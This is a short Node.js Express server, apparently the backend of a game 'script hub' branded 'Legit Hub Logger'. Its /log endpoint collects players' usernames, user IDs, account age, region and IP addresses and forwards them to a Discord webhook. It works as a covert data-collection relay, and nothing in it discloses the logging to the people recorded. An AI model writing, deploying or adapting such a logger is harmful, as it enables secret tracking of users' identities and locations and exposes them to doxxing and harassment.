const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// Reemplaza con tu URL de webhook de Discord real
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI";

app.post('/log', async (req, res) => {
    try {
        const { username, displayName, userId, gameId, accountAge, region, ip } = req.body;
        const clientIP = ip || req.ip || req.connection.remoteAddress || 'N/A';

        // 65484 es el código decimal para el color Hex #00FFCC (Verde Cian)
        const payload = {
            content: "⚔️ **Legit Hub Logger**",
            embeds: [{
                color: 65484, 
                fields: [
                    { name: "👤 Username", value: username || "Unknown", inline: true },
                    { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
                    { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true },
                    { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
                    { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
                    { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
                    { name: "🌐 Game ID", value: String(gameId || "N/A"), inline: false }
                ],
                footer: { text: "Legit Hub System" },
                timestamp: new Date().toISOString()
            }]
        };

        await axios.post(DISCORD_WEBHOOK, payload);
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.listen(port, () => {
    console.log(`⚔️ Legit Hub Server corriendo en puerto ${port}`);
});
